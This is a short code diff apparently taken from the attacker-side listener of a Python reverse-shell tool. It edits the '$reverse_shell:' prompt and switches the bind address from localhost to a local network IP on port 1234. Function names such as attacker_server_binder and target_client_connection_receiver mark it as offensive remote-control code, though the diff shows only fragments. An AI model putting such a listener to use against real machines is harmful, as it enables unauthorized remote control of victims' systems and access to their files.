@@ -17,7 +17,7 @@ def target_client_connection_receiver():
         
         if(target_client != None):
             break
-    print("Connection established to target\n $reverse_shell: ", end="")
+    print("Connection established to target\n$reverse_shell: ", end="")
     return target_client
 
 
@@ -76,7 +76,7 @@ def file_handler(target_client, command):
         receive_data(target_client)
 
 def main():
-    attacker_server_binder("localhost", 1234)
+    attacker_server_binder("192.168.43.34", 1234)
 
     # receive connection from target client
     target_client = target_client_connection_receiver()
